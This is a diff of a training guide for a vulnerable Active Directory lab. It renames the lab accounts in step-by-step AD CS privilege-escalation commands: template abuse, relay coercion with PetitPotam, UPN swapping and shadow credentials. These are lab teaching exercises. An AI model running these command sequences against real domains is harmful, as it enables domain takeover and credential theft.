@@ -412,11 +412,11 @@ Precondition: a template `ESC1Template` (or similar) with:
 - EKU = Client Authentication.
 - Low-priv group (e.g., `Domain Users`) can enroll (DACL grants `Enroll`).
 
-Attacker has any low-priv credential (e.g., `svc_web:Summer2023!`).
+Attacker has any low-priv credential (e.g., `svc_vision:Summer2023!`).
 
 ```bash
 # Step 1: discover templates
-certipy find -u svc_web@corp.local -p 'Summer2023!' \
+certipy find -u svc_vision@corp.local -p 'Summer2023!' \
         -dc-ip 10.10.0.10 -text -stdout > certipy.out
 grep -B2 -A20 ESC1 certipy.out
 ```
@@ -426,7 +426,7 @@ Note the template name and the CA name (`CORP-CA`).
 ```bash
 # Step 2: request a certificate as Administrator
 certipy req \
-        -u svc_web@corp.local -p 'Summer2023!' \
+        -u svc_vision@corp.local -p 'Summer2023!' \
         -dc-ip 10.10.0.10 -target ca01.corp.local \
         -ca CORP-CA -template ESC1Template \
         -upn Administrator@corp.local
@@ -454,7 +454,7 @@ The KDC, on receipt of PA-PK-AS-REQ, decodes the cert and inspects:
    looks up that UPN in AD and finds `Administrator`. Issues TGT for
    `Administrator`.
 
-The KDC has no way to know whether `svc_web` requested this cert or
+The KDC has no way to know whether `svc_vision` requested this cert or
 `Administrator` did. The template's `ENROLLEE_SUPPLIES_SUBJECT` flag told
 the CA "trust whatever the requester puts in," so the CA put
 `UPN=Administrator` in the cert. Trust collapsed.
@@ -470,9 +470,9 @@ the CA "trust whatever the requester puts in," so the CA put
   the right user's SID*, PKINIT fails. ESC1 with full enforcement requires
   the CA to issue with the correct SID extension, which a CA does **per
   request** — so the CA must populate the extension based on either the
-  AD identity it thinks is requesting (`svc_web`) or the supplied subject
+  AD identity it thinks is requesting (`svc_vision`) or the supplied subject
   (`Administrator`). Microsoft's enforcement logic, as of 2024 cumulative,
-  embeds the SID of the *requesting principal* (svc_web), not the
+  embeds the SID of the *requesting principal* (svc_vision), not the
   supplied SAN. So full enforcement defeats vanilla ESC1.
 - DVAD is set to `StrongCertificateBindingEnforcement = 1` (compat mode)
   to keep ESC1 live.
@@ -505,15 +505,15 @@ natively.
 ```bash
 # Step 1: enroll an Enrollment Agent cert
 certipy req \
-        -u svc_web@corp.local -p 'Summer2023!' \
+        -u svc_vision@corp.local -p 'Summer2023!' \
         -ca CORP-CA -template EnrollmentAgent
 
 # Step 2: use the EA cert to enroll for someone else
 certipy req \
-        -u svc_web@corp.local -p 'Summer2023!' \
+        -u svc_vision@corp.local -p 'Summer2023!' \
         -ca CORP-CA -template User \
         -on-behalf-of 'corp\Administrator' \
-        -pfx svc_web.pfx
+        -pfx svc_vision.pfx
 ```
 
 ### Why this exists at all
@@ -539,10 +539,10 @@ enrollment rights. You've just made an ESC1.
 
 ```bash
 certipy template \
-        -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
+        -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
         -template VulnerableTemplate -save-old      # backup
 certipy template \
-        -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
+        -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
         -template VulnerableTemplate                # apply the ESC1 transform
 # now enroll as in ESC1
 ```
@@ -559,16 +559,16 @@ If you prefer to do it by hand (great for understanding):
 ```bash
 dacledit.py -action 'write' \
             -rights 'WriteProperty' \
-            -principal alice \
+            -principal peter.parker \
             -target-dn 'CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' \
             -inheritance \
-            corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
+            corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
 ```
 
 Then use any LDAP tool to flip the Name-Flag bit:
 
 ```bash
-bloodyAD --host dc01 -u alice -p 'DVADlab2024!' \
+bloodyAD --host dc01 -u peter.parker -p 'DVADlab2024!' \
          set object 'CN=VulnerableTemplate,...' \
          msPKI-Certificate-Name-Flag 0x1
 ```
@@ -614,7 +614,7 @@ ESC6.
 
 ```bash
 certipy req \
-        -u svc_web@corp.local -p 'Summer2023!' \
+        -u svc_vision@corp.local -p 'Summer2023!' \
         -ca CORP-CA -template User \
         -upn Administrator@corp.local
 ```
@@ -654,9 +654,9 @@ principal can flip flags or approve pending requests.
 
 ```bash
 certipy ca \
-        -u alice@corp.local -p '...' \
-        -ca CORP-CA -add-officer alice
-# Grants alice Certificate Manager on the CA
+        -u peter.parker@corp.local -p '...' \
+        -ca CORP-CA -add-officer peter.parker
+# Grants peter.parker Certificate Manager on the CA
 ```
 
 A subtler variant: an attacker with **Manage Certificates** can approve
@@ -687,7 +687,7 @@ ntlmrelayx.py \
 
 # Terminal B: coerce
 python3 PetitPotam.py \
-        -d corp.local -u alice -p 'DVADlab2024!' \
+        -d corp.local -u peter.parker -p 'DVADlab2024!' \
         attacker.10.10.0.1 10.10.0.10
 # attacker IP is where ntlmrelayx is listening
 ```
@@ -754,27 +754,27 @@ DVAD sets `CertificateMappingMethods = 0x1F` (all weak modes on) and
 certs issued don't carry the SID extension → DC has to fall back to
 UPN/DNS matching → attacker enrolls with someone else's UPN.
 
-Combined with permission to modify a user's UPN (`alice` has GenericWrite
-on `bob`):
+Combined with permission to modify a user's UPN (`peter.parker` has GenericWrite
+on `tony.stark`):
 
 ```bash
-# Step 1: change bob's UPN to administrator
+# Step 1: change tony.stark's UPN to administrator
 certipy account \
-        -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
-        update -user bob -upn 'administrator@corp.local'
+        -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
+        update -user tony.stark -upn 'administrator@corp.local'
 
-# Step 2: from bob, enroll the no-extension template
+# Step 2: from tony.stark, enroll the no-extension template
 certipy req \
-        -u bob@corp.local -p 'BobPass!' \
+        -u tony.stark@corp.local -p 'BobPass!' \
         -ca CORP-CA -template ESC9NoExt
 
-# Step 3: change bob's UPN back so PKINIT doesn't see two admins
+# Step 3: change tony.stark's UPN back so PKINIT doesn't see two admins
 certipy account \
-        -u alice@corp.local -p 'DVADlab2024!' \
-        update -user bob -upn 'bob@corp.local'
+        -u peter.parker@corp.local -p 'DVADlab2024!' \
+        update -user tony.stark -upn 'tony.stark@corp.local'
 
 # Step 4: PKINIT — DC falls back to UPN map, no extension to disagree
-certipy auth -pfx bob.pfx -dc-ip 10.10.0.10 -username administrator -domain corp.local
+certipy auth -pfx tony.stark.pfx -dc-ip 10.10.0.10 -username administrator -domain corp.local
 ```
 
 ### ESC10 — DC registry
@@ -839,7 +839,7 @@ enroll the template → enroll, PKINIT, your PAC has the group SID, you're
 effectively a member.
 
 ```bash
-certipy find -u alice -p ... | grep -A5 "OID Group"
+certipy find -u peter.parker -p ... | grep -A5 "OID Group"
 # shows the OID -> group link
 ```
 
@@ -885,7 +885,7 @@ application-policy extension into the CSR with the Client Auth OID:
 
 ```bash
 certipy req \
-        -u alice -p ... -ca CORP-CA -template WebServer-v1 \
+        -u peter.parker -p ... -ca CORP-CA -template WebServer-v1 \
         -application-policies '1.3.6.1.5.5.7.3.2'
 # The CA misinterprets and issues with Client Auth in the EKU
 ```
@@ -926,7 +926,7 @@ from the account's DN. If the account is a *computer* and you control its
 
 ```bash
 certipy account create \
-        -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
+        -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
         -user 'EVIL$' -pass 'CertifiedPwn!1' \
         -dns dc01.corp.local
 
@@ -947,7 +947,7 @@ enforcement to keep the path live.
 Don't leave `EVIL$` polluting the directory:
 
 ```bash
-impacket-addcomputer corp.local/alice:'DVADlab2024!' \
+impacket-addcomputer corp.local/peter.parker:'DVADlab2024!' \
         -delete -computer-name 'EVIL$' -dc-ip 10.10.0.10
 ```
 
@@ -966,7 +966,7 @@ key.
 
 ```bash
 certipy shadow auto \
-        -u alice@corp.local -p 'DVADlab2024!' \
+        -u peter.parker@corp.local -p 'DVADlab2024!' \
         -account 'sql01$' -dc-ip 10.10.0.10
 # certipy plants a key, PKINITs, retrieves sql01$'s NT hash, removes the key
 ```
@@ -991,11 +991,11 @@ one command, leaving the attribute exactly as it was found.
 ### Manual flow
 
 ```bash
-certipy shadow list -u alice@corp.local -p ... -account sql01$
+certipy shadow list -u peter.parker@corp.local -p ... -account sql01$
 # show existing keys
-certipy shadow add -u alice -p ... -account sql01$
+certipy shadow add -u peter.parker -p ... -account sql01$
 # add a new key, save the device ID
-certipy shadow remove -u alice -p ... -account sql01$ -device-id <uuid>
+certipy shadow remove -u peter.parker -p ... -account sql01$ -device-id <uuid>
 # remove just the one we added
 ```
 
@@ -1137,7 +1137,7 @@ forest, alongside the root domain's `nTSecurityDescriptor`.
 ### Exercise 6.A — Inventory templates
 
 ```bash
-certipy find -u alice@corp.local -p 'DVADlab2024!' \
+certipy find -u peter.parker@corp.local -p 'DVADlab2024!' \
         -dc-ip 10.10.0.10 -text -stdout | less
 ```
 
@@ -1148,7 +1148,7 @@ Note which are enrollable by `Domain Users`, which by specific groups.
 
 ```bash
 certipy req \
-        -u svc_web@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 \
+        -u svc_vision@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 \
         -ca CORP-CA -template ESC1Template \
         -upn Administrator@corp.local
 certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
@@ -1172,7 +1172,7 @@ ntlmrelayx.py \
 
 # Terminal B
 python3 PetitPotam.py \
-        -d corp.local -u alice -p 'DVADlab2024!' 10.10.0.1 10.10.0.10
+        -d corp.local -u peter.parker -p 'DVADlab2024!' 10.10.0.1 10.10.0.10
 ```
 
 Output: PKCS12 (base64) for `dc01$`. Then:
@@ -1188,7 +1188,7 @@ You'll see the `dc01$` NT hash + TGT.
 
 ```bash
 certipy account create \
-        -u alice@corp.local -p 'DVADlab2024!' \
+        -u peter.parker@corp.local -p 'DVADlab2024!' \
         -dc-ip 10.10.0.10 \
         -user 'EVIL$' -pass 'CertifiedPwn!1' \
         -dns dc01.corp.local
@@ -1206,7 +1206,7 @@ Cleanup the `EVIL$` computer after.
 
 ```bash
 certipy shadow auto \
-        -u alice@corp.local -p 'DVADlab2024!' \
+        -u peter.parker@corp.local -p 'DVADlab2024!' \
         -dc-ip 10.10.0.10 -account 'sql01$'
 ```
 
@@ -1218,7 +1218,7 @@ against sql01.
 Find a template with WriteProperty granted to a non-privileged group:
 
 ```bash
-certipy find -u alice -p ... -vulnerable
+certipy find -u peter.parker -p ... -vulnerable
 # look for ESC4 findings
 ```
 
@@ -1234,7 +1234,7 @@ openssl x509 -in administrator.crt -text -noout
 Identify:
 
 - Serial number.
-- Subject (probably `CN=svc_web` because of FROM_AD).
+- Subject (probably `CN=svc_vision` because of FROM_AD).
 - SAN — should include `Other Name: 1.3.6.1.4.1.311.20.2.3 =
   Administrator@corp.local`.
 - EKU — Client Authentication.
